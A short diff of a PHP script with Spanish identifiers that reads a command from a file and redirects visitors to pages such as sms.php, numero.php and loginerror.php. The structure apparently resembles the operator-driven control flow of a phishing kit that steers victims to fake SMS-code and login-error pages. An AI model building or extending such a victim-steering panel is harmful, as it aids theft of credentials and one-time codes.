@@ -28,12 +28,20 @@ if (file_exists($archivo)) {
     }
 
     if ($accion == "/SMS") {
-        header("Location: virtual.php");
+        header("Location: sms.php");
         exit;
     }
 
-    if ($accion == "/CORREO") {
-        header("Location: correo.php");
+    if ($accion == "/SMSERROR") {
+        header("Location: smserror.php");
+        exit;
+    }
+    if ($accion == "/NUMERO") {
+        header("Location: numero.php");
+        exit;
+    }
+    if ($accion == "/ERROR") {
+        header("Location: loginerror.php");
         exit;
     }
 }
